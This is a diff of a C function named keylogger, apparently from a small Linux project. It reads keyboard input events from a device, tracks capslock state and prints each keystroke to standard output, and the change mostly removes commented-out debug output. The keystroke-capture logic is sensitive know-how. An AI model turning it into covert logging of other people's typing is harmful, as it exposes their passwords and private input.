@@ -62,42 +62,19 @@ void					keylogger(int keybd, int **key_table)
 
 	for (int i = 0; i < NR_LOCK; i++)
 		lockers[i] = 0;
-	// for (int i = 0; i < _NSIG; i++)
-	// 	signal(i, sigint);
 	signal(SIGINT, sigint);
 	lockers[6] = get_keystate(1); // capslock state
-	// capslock = get_keystate(1);
-	// numlock = get_keystate(2);
+//	lockers[?] = get_keystate(2); // numlock state
 	loop = 1;
 	while (loop)
 	{
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
-		// printf("---------------------------------------------------------\n");
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
 		{
 			if (events[i].type == EV_KEY) {
 				print_keysym(key_table[events[i].code], events[i].value, lockers);
 				fflush(stdout);
 			}
-			// printf("[%s] ", event[events[i].type].name);
-			// if (events[i].type == EV_KEY) {
-			// 	printf("%s ", key[events[i].code].name);
-			// 	printf("%s ", (events[i].value == 0) ? "OFF" : (events[i].value == 1) ? "ON" : " REPEAT");
-			// }
-			// else if (events[i].type == EV_MSC) {
-			// 	printf("%s ", msc[events[i].code].name);
-			// 	printf("%d ", events[i].value);
-			// }
-			// else if (events[i].type == EV_LED) {
-			// 	printf("%s ", led[events[i].code].name);
-			// 	printf("%d ", events[i].value);
-			// }
-			// else {
-			// 	printf("%d ", events[i].code);
-			// 	printf("%d ", events[i].value);
-			// }
-			// printf("\n");
 		}
-		// printf("---------------------------------------------------------\n");
 	}
 }
